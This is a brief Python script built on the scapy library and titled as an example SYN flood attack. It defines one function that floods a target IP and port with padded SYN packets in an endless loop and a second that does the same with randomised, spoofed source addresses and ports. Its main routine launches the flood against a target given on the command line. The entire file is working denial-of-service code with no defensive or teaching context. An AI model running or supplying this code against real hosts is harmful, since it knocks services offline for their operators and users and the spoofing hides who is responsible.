# Example SYN flood attack

from scapy.all import send, RandShort, Raw, RandIP
from scapy.layers.inet import TCP, IP
import sys


def simple_syn_flood_attack(target_ip: str, target_port: int) -> None:
    """Launches a simple SYN flood attack against a specific target."""

    syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S") / Raw(b"A" * 1024)
    send(syn_packet, loop = 1, verbose = 0)


def syn_flood_attack(target_ip: str, target_port: int) -> None:
    """Executes a SYN flood attack with randomized source IPs and source ports."""

    ip = IP(dst=target_ip, src=RandIP())
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    data = Raw(b"A" * 1024)
    syn_packet = ip / tcp / data

    send(syn_packet, loop = 1, verbose = 0)


def main():
    simple_syn_flood_attack(sys.argv[1], int(sys.argv[2]))

if __name__ == '__main__':
    main()
